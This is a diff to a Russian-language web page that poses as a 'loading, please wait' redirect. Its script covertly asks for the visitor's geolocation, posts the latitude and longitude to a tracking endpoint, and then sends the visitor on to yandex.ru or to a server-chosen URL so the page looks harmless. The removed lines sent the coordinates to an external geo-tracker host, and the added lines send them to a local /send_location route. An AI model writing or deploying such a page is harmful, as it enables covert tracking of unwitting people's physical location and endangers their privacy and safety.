@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <title>Добро пожаловать</title>
+  <title>Пероход на новую страницу...</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -20,28 +20,37 @@
 <body>
   <div class="message">Загружаем контент, пожалуйста, подождите...</div>
   <script>
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        fetch('https://geo-tracker-l5ui.onrender.com/send_location', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude
-          })
-        });
-        // После получения координат делаем редирект
-        setTimeout(() => {
-          window.location.href = 'https://yandex.ru'; // <- сюда можно любой нормальный сайт
-        }, 1500);
-      },
-      err => {
-        // Если отказ или ошибка — тоже редирект
-        setTimeout(() => {
-          window.location.href = 'https://yandex.ru';
-        }, 1500);
-      }
-    );
+    let redirectUrl = "https://yandex.ru"; // запасной на всякий случай
+
+    fetch('/get_redirect')
+      .then(res => res.json())
+      .then(data => {
+        if (data.redirect_url) redirectUrl = data.redirect_url;
+      })
+      .catch(() => {})  // если не получилось — fallback
+
+      .finally(() => {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            fetch('/send_location', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude
+              })
+            });
+            setTimeout(() => {
+              window.location.href = redirectUrl;
+            }, 1500);
+          },
+          err => {
+            setTimeout(() => {
+              window.location.href = redirectUrl;
+            }, 1500);
+          }
+        );
+      });
   </script>
 </body>
 </html>
